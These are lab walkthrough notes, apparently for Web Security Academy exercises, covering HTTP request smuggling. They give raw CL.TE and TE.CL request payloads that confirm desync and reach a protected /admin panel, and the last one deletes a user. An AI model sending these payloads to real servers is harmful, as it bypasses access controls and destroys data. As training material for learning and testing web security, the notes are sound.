# Some cases of HTTP request smuggling

## 1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

The second request should receive an HTTP 404 response.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

## 2. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked (setting icon near `Send`)

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

The second request should receive an HTTP 404 response.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

## 3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

Try to visit /admin and observe that the request is blocked.

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

Observe that the merged request to /admin was rejected due to not using the header `Host: localhost`.

Issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.

Issue the following request twice so the second request's headers are appended to the smuggled request body instead:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Observe that you can now access the admin panel.

Using the previous response as a reference, change the smuggled request URL to delete carlos:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
